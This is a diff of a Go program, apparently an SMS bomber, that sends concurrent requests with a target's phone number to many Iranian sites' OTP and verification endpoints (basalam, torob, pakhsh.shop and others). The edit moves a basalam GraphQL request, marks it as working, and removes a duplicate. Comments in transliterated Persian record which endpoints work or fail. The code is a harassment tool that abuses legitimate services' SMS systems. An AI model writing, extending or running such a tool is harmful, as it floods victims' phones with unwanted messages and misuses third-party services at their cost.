@@ -143,7 +143,11 @@ func main() {
 		}, ch)  // add site
 		go sms("https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
 			"mobile": phone,
-		}, ch)  // add site
+		}, ch)  // add site   // active ✅
+		s26 := fmt.Sprintf("'variables': {'mobile': %s,'query': 'mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }'", phone)
+		go sms("https://api.basalam.com/user", map[string]interface{}{
+			s26: phone,
+		}, ch)  // active ✅
 		go sms("https://api.torob.com/v4/user/phone/send-pin/?phone_number=phone&source=next_desktop", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)   // add site   moshkel dareh❌❌❌ hamchenin in site neshan.org & technolife.com
@@ -283,9 +287,6 @@ func main() {
 		go sms("https://www.zzzagros.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"username": phone,
 		}, ch)    // add site
-		go sms("https://auth.basalam.com/otp-request", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // dar khate 126 va 641 neveshteh shodeh.
 		go sms("https://arastag.ir/wp-admin/admin-ajax.php", map[string]interface{}{
 			"mobileemail": phone,
 		}, ch)    // add site
@@ -663,10 +664,6 @@ func main() {
 		s25 := fmt.Sprintf("'action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'", phone)
 		go sms("https://www.pakhsh.shop/wp-admin/admin-ajax.php", map[string]interface{}{
 			s25: phone,
-		}, ch)
-		s26 := fmt.Sprintf("'variables': {'mobile': %s,'query': 'mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }'", phone)
-		go sms("https://api.basalam.com/user", map[string]interface{}{
-			s26: phone,
 		}, ch)
 		s27 := fmt.Sprintf("'mobile': %s,'action': 'sendsms'", phone)
 		go sms("https://crm.see5.net/api_ajax/sendotp.php", map[string]interface{}{
